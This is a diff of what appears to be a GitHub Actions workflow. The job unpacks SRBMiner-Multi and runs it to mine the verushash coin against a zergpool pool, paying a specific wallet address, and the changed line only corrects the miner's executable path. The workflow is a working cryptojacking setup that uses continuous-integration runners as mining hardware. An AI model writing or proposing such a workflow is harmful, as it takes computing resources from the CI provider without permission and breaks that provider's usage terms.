@@ -21,6 +21,6 @@ jobs:
     - name: Seting-UP
       run: Expand-Archive SRBMiner-Multi-0-7-1-win64.zip
     - name: Running
-      run: .\SRBMiner-Multi-0-7-1-win64\SRBMiner-MULTI.exe --disable-gpu --algorithm verushash --pool verushash.eu.mine.zergpool.com:3300 --wallet RRXHEEUz375MFhLyP7T9iU4s2npBZj4o7U
+      run: .\SRBMiner-Multi\SRBMiner-MULTI.exe --disable-gpu --algorithm verushash --pool verushash.eu.mine.zergpool.com:3300 --wallet RRXHEEUz375MFhLyP7T9iU4s2npBZj4o7U
     - name: DONE
       run: exit
